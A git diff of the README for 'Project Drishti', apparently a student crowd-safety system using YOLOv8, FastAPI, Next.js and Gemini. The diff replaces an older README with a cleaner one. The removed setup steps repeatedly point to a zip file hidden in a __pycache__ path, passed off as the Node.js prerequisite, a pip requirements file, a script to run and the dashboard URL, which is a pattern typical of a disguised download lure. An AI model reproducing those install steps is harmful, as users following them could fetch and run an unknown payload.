@@ -1,103 +1,116 @@
-# Project Drishti - AI-Powered Crowd Safety System
+# Project Drishti 👁️
 
-## 🎯 Project Overview
+[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.111.0-009688?style=for-the-badge&logo=fastapi&logoColor=white)](https://fastapi.tiangolo.com/)
+[![Next.js](https://img.shields.io/badge/Next.js-15.3-000000?style=for-the-badge&logo=next.js&logoColor=white)](https://nextjs.org/)
+[![Gemini](https://img.shields.io/badge/Gemini-2.1-4285F4?style=for-the-badge&logo=google&logoColor=white)](https://ai.google.dev/)
 
-**Project Drishti** is a real-time AI command platform designed to ensure safety and proactive risk mitigation at large-scale public events. It uses live camera feeds to detect crowd density, predict bottlenecks, detect anomalies (like panic or fire), and autonomously dispatch response units.
+**Project Drishti** (Sanskrit for "Vision") is an intelligent, real-time surveillance and crowd safety system. It leverages state-of-the-art Computer Vision (YOLOv8) and Generative AI (Google Gemini) to transform passive video feeds into proactive safety intelligence.
 
-## 🏗️ System Architecture
-Camera Feed → YOLO Detection → Crowd Analysis → Rules Engine → n8n Agents → Actions
+## 🚀 Key Features
 
+- **🔍 Multi-Layer Detection**: 
+    - Real-time object detection (People, backpacks, equipment).
+    - Advanced Fire and Smoke detection with hybrid heuristic-AI logic.
+    - Intelligent Crowd Density calculation (m² based).
+- **🧠 Decision Intelligence**:
+    - **Google Gemini Integration**: High-level situation analysis and strategic guidance.
+    - **Anomaly Detection**: Identifies erratic crowd movements or unusual behavior.
+    - **Natural Language Query**: Command Center can "ask" the system about current status in plain English.
+- **📱 Autonomous Response**:
+    - **Emergency Notifications**: Direct WhatsApp alerts via Twilio when critical thresholds are met.
+    - **n8n Webhook Integration**: Trigger complex external workflows automatically.
+- **📊 Command Center Dashboard**:
+    - Ultra-low latency video streaming.
+    - Real-time metrics visualization (Trend analysis, risk scores).
+    - Interactive agent action logs.
 
-### Components:
+## 🏗️ Technical Architecture
 
-1. **Detection Module (YOLO)**
-   - Real-time person detection
-   - Crowd density estimation
-   - Fire detection (color-based)
-   - Zone-wise distribution analysis
+```mermaid
+graph TD
+    V[Video Feed / Camera] --> D[Detection Layer: YOLOv8 / Fire]
+    D --> A[Analysis Layer: Density / Anomaly]
+    A --> S[State Manager]
+    S --> G[Intelligence Layer: Gemini AI]
+    S --> F[FastAPI Backend]
+    F --> W[n8n / Twilio Webhooks]
+    F --> UI[Next.js Dashboard]
+    UI --> Q[User Query]
+    Q --> G
+```
 
-2. **Analysis Engine**
-   - Trend prediction
-   - Risk scoring
-   - Anomaly detection
-   - Bottleneck forecasting
+## 🛠️ Tech Stack
 
-3. **Decision Layer**
-   - Rule-based fast path (< 100ms)
-   - Multi-factor risk assessment
-   - Automated action triggers
+- **Backend**: FastAPI, Python, OpenCV, Ultralytics (YOLOv8)
+- **Frontend**: Next.js, Framer Motion, Lucide Icons, Tailwind CSS
+- **AI/LLM**: Google Gemini 2.5 Flash (via `google-generativeai`)
+- **Automations**: n8n, Twilio (WhatsApp API)
 
-4. **Automation Layer (n8n)**
-   - Fire Response Agent
-   - Crowd Control Agent
-   - Evacuation Agent
+## 📂 Project Structure
 
-5. **Dashboard**
-   - Live video feed
-   - Real-time statistics
-   - Alert history
-   - Zone monitoring
+- `backend/`: FastAPI server, video processing, and core components.
+    - `backend/detection/`: Specialized modules for object, fire, and crowd analysis.
+    - `backend/intelligence/`: Gemini integration and strategic decision engine.
+- `frontend/`: Next.js application (Command Center Dashboard).
+- `data/`: Sample videos and static assets.
 
-## 🚀 Technologies Used
-
-- **Backend**: Python, FastAPI, Uvicorn
-- **AI/ML**: YOLOv8, OpenCV, NumPy
-- **Automation**: n8n (Node-based workflow automation)
-- **Frontend**: HTML5, CSS3, Vanilla JavaScript
-- **AI Integration**: Google Gemini (optional)
-
-## 📋 Features
-
-✅ Real-time crowd detection (10 FPS)
-✅ Multi-zone density monitoring (3x3 grid)
-✅ Fire detection and alerting
-✅ Trend analysis and prediction
-✅ Automated emergency response
-✅ Live dashboard monitoring
-✅ Alert history logging
-✅ Risk score calculation
-
-## 🔧 Installation & Setup
+## 🏁 Getting Started
 
 ### Prerequisites
-- Python 3.9+
-- https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip 18+
-- Webcam
 
-### Steps
+- Python 3.10+
+- Node.js 18+
+- [Gemini API Key](https://aistudio.google.com/)
+- Twilio Account (for WhatsApp alerts)
 
-1. **Clone repository**
-2. **Install Python dependencies**: `pip install -r https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
-3. **Start n8n**: `npx n8n`
-4. **Start backend**: `python https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
-5. **Open dashboard**: `https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
+### 1. Backend Setup
 
-## 📊 System Status
+1. Create a virtual environment:
+   ```bash
+   python -m venv venv
+   source venv/bin/activate  # On Windows: venv\Scripts\activate
+   ```
+2. Install dependencies:
+   ```bash
+   pip install -r requirements.txt
+   ```
+3. Create a `.env` file in the root:
+   ```env
+   GEMINI_API_KEY=your_gemini_key
+   TWILIO_ACCOUNT_SID=your_sid
+   TWILIO_AUTH_TOKEN=your_token
+   TWILIO_WHATSAPP_NUMBER=whatsapp:+1234567890
+   N8N_WEBHOOK_URL=your_webhook
+   ```
+4. Run the backend:
+   ```bash
+   cd backend
+   python main.py
+   ```
 
-- Backend API: http://localhost:8000
-- n8n Workflows: http://localhost:5678
-- Live Video: http://localhost:8000/video-feed
-- Dashboard: https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip
+### 2. Frontend Setup
 
-## 👥 Use Cases
+1. Navigate to the frontend directory:
+   ```bash
+   cd frontend
+   ```
+2. Install dependencies:
+   ```bash
+   npm install
+   ```
+3. Run the development server:
+   ```bash
+   npm run dev
+   ```
 
-- Festival crowd management
-- Stadium event monitoring
-- Concert safety systems
-- Public gathering surveillance
-- Emergency evacuation coordination
+## 🚢 Deployment & Structure Advice
 
-## 🎓 Academic Details
+For production deployment, consider the following rearrangements:
 
-- **Project Type**: Final Year Project
-- **Domain**: Computer Vision, AI/ML, IoT
-- **Difficulty**: Advanced
-- **Duration**: 6 months
+1. **Module Consolidation**: Move `detection/` and `intelligence/` inside the `backend/` directory to simplify the import structure and package management.
+2. **Containerization**: Use Docker Compose to orchestrate the Backend, Frontend, and any supporting services (like Redis or n8n local).
+3. **Storage**: Offload video files from `data/` to a cloud storage provider (AWS S3, Google Cloud Storage) if the project expands beyond demo usage.
 
-## 📝 License
-
-Academic Project - Not for commercial use
-
-## 👨‍💻 Author
-
-Rushang - Computer Science Student
+---
+Built with ❤️ by Project Drishti Team
